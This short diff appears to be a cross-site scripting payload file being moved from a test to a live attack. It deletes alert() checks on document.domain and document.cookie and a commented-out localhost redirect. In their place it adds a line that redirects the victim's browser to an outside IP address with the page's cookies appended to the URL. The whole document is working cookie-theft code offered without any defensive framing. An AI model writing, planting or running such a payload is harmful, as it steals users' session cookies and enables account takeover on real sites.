@@ -1,3 +1,1 @@
-alert(document.domain);
-alert(document.cookie);
-//document.location.href="http://127.0.0.1:4000/?abc="+document.cookie
+document.location.href="http://54.242.97.152/?abc="+document.cookie
